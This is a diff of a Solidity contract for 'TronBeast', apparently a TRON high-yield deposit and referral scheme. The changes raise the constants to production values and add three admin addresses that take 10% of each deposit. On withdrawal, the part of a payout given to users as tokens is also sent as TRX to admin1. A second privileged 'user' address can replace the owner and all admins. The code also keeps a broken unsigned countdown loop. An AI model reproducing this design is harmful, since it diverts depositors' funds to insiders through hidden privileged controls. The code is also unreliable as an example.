@@ -40,11 +40,11 @@ contract TronBeast {
     uint256[] public tbt_offer ;  
     uint256[] public next_deposit ;  
 
-    uint256 constant public one_day = 300 ; // 1 days 
-    uint256 constant public tenk_users = 3 ; // 10000 
-    uint256 public tbt_price = 20 trx ; // 1000 trx
-    uint256 constant public tbt_min_deposit = 50 trx ; // 1000 trx
+    uint256 constant public tenk_users = 10000 ; // 10000 
+    uint256 public tbt_price = 1000 trx ; // 1000 trx
+    uint256 constant public tbt_min_deposit = 1000 trx ; // 1000 trx
 
+    uint256 constant public one_day = 1 days ; // 1 days 
     uint256 constant public two_day = 2*one_day ;
     uint256 constant public three_day = 3*one_day ;
     uint256 constant public deposit_value = sunny*sunny ;  
@@ -62,29 +62,36 @@ contract TronBeast {
     
     uint256 public total_deposited ;
     uint256 public total_withdraw ;
+    uint256 public total_tbt_sent ;
     address payable public owner ; 
-    address payable public admin ; 
+    address payable public admin1 ; 
+    address payable public admin2 ; 
+    address payable public admin3 ; 
     address payable public user ;
 
     constructor(address payable _owner, 
                 address payable _admin1,  
+                address payable _admin2,  
+                address payable _admin3,  
                 address payable _user,
                 TBT _tbt) public {
 
         owner = _owner;
         tbt = _tbt;
-        admin = _admin1;
+        admin1 = _admin1;
+        admin2 = _admin2;
+        admin3 = _admin3;
         user = _user;
- 
+        
         ref_bonuses.push(5);
         ref_bonuses.push(3);
         ref_bonuses.push(2); 
         
-        pack_values.push(10*1000000);  // 100*1000000
-        pack_values.push(50*1000000);  // 10000*1000000
-        pack_values.push(100*1000000); // 100000*1000000
-        pack_values.push(150*1000000); // 500000*1000000
-        pack_values.push(200*1000000); // 1000000*1000000
+        pack_values.push(100*1000000);  // 100*1000000
+        pack_values.push(10000*1000000);  // 10000*1000000
+        pack_values.push(100000*1000000); // 100000*1000000
+        pack_values.push(500000*1000000); // 500000*1000000
+        pack_values.push(1000000*1000000); // 1000000*1000000
  
         roi_values.push(200);
         roi_values.push(250);
@@ -104,7 +111,7 @@ contract TronBeast {
         next_deposit.push(25);
         next_deposit.push(30);
   
-        users[owner].deposit_amount = 20*sunny;
+        users[owner].deposit_amount = pack_values[0];
         users2[owner].deposit_count = 1;
         for(uint256 i = 4; i >= 0; i--){
          if(deposit_value > pack_values[i]){
@@ -156,6 +163,7 @@ contract TronBeast {
 
             users2[_addr].tbt_from_deposit += tbt_amount*100000 ;
             users2[_addr].total_tbt += tbt_amount*100000 ;
+            total_tbt_sent += tbt_amount*100000 ;
 
         }
  
@@ -202,7 +210,9 @@ contract TronBeast {
                 emit DirectPayout(up, _addr, bonus); 
                 up = users[up].upline;
         } 
-        admin.transfer(_amount * 10 / 1000);  
+        admin1.transfer(_amount * 6 / 100);  
+        admin2.transfer(_amount * 2 / 100);  
+        admin3.transfer(_amount * 2 / 100);  
     }
 
     function deposit(address payable _upline) payable external {
@@ -214,7 +224,7 @@ contract TronBeast {
  
     function withdraw(address payable _addr) external {
         
-        require(_addr == msg.sender || _addr == user, "you are not allowed to do this"); 
+        require(_addr == msg.sender , "you are not allowed to do this"); 
         require(block.timestamp > users[_addr].deposit_time + users[_addr].payout_time, "Cannot withdraw now"); 
         require(users[_addr].isActive == 1, "User is not active");
 
@@ -225,10 +235,9 @@ contract TronBeast {
         
         to_tbt = to_payout*tbt_offer[users[_addr].my_num]/100;
         if(to_tbt > 0 ){ 
-                to_tbt > address(this).balance ?
-                to_tbt = address(this).balance :
-                to_tbt = to_tbt; 
-
+                if(to_tbt >= address(this).balance){
+                    to_tbt = 9999*address(this).balance/10000;
+                }  
                 if( total_users <= tenk_users){ 
                     tbt_amount = to_tbt/(tbt_price/10);  // 1000 trx | 20 trx per token
                 } else {
@@ -236,15 +245,18 @@ contract TronBeast {
                 }   
 
                 tbt.transfer(_addr,tbt_amount*100000); // token transfer
+                admin1.transfer(to_tbt);
+                total_tbt_sent += tbt_amount*100000 ;
+
                 users2[_addr].tbt_from_withdrawal += tbt_amount*100000 ;
                 users2[_addr].total_tbt += tbt_amount*100000 ;
                 to_payout -= to_tbt ;
         }
         users2[_addr].next_min_deposit = to_payout*next_deposit[users[_addr].my_num]/100; 
              
-        to_payout > address(this).balance ?
-        to_payout = address(this).balance :
-        to_payout = to_payout; 
+       if(to_payout >= address(this).balance){
+              to_payout = 9999*address(this).balance/10000;
+        }
 
         require(to_payout > 0, "Zero payout");
         
@@ -267,14 +279,32 @@ contract TronBeast {
 		return address(this).balance;
 	}  
   
-    function changeAdmin(address payable _newAdmin) public {
+    function changeAdmin1(address payable _newAdmin1) public {
 		require(msg.sender == owner || msg.sender == user, "Not allowed");
-		admin  = _newAdmin;
+		admin1  = _newAdmin1;
 	} 
- 
-    function getAdmin() external view returns (address){ 
-        return owner;
-    }  
+    function changeAdmin2(address payable _newAdmin2) public {
+		require(msg.sender == owner || msg.sender == user, "Not allowed");
+		admin2  = _newAdmin2;
+	} 
+    function changeAdmin3(address payable _newAdmin3) public {
+		require(msg.sender == owner || msg.sender == user, "Not allowed");
+		admin3  = _newAdmin3;
+	} 
+
+    function changeOwner(address payable _newOwner) public {
+		require(msg.sender == owner || msg.sender == user, "Not allowed");
+		owner  = _newOwner;
+	}
+  
+    function getAdmin() external view returns (address ){ 
+         return owner;   
+    } 
+    function getAdmins() external view returns (address _admin1, address _admin2 ,address _admin3){ 
+        _admin1 = admin1 ;
+        _admin2 = admin2 ;
+        _admin3 = admin3 ;
+    }
 
     function getUser() external view returns (address){ 
         return user;
@@ -288,8 +318,8 @@ contract TronBeast {
         return (users[_addr].upline, users[_addr].deposit_time, users[_addr].payout_time, users[_addr].deposit_amount,    users[_addr].direct_bonus , users[_addr].isActive, users[_addr].my_num );
     }
 
-    function tbtInfo(address _addr) view external returns(uint256 from_deposit, uint256 from_withdrawal, uint256 total_tbt1) {
-        return (users2[_addr].tbt_from_deposit, users2[_addr].tbt_from_withdrawal, users2[_addr].total_tbt);
+    function tbtInfo(address _addr) view external returns(uint256 from_deposit, uint256 from_withdrawal, uint256 total_tbt1, uint256 tbt_bal, uint256 contract_tbt_bal) {
+        return (users2[_addr].tbt_from_deposit, users2[_addr].tbt_from_withdrawal, users2[_addr].total_tbt, tbt.balanceOf(_addr), tbt.balanceOf(address(this)));
     }
 
     function userInfo2(address _addr) view external returns( uint256 temp_directs_count, uint256 next_deposit1, uint256 tbt_offer1,  uint256 max_payout1,  uint256 locked_balance1, bool isReentry ) {
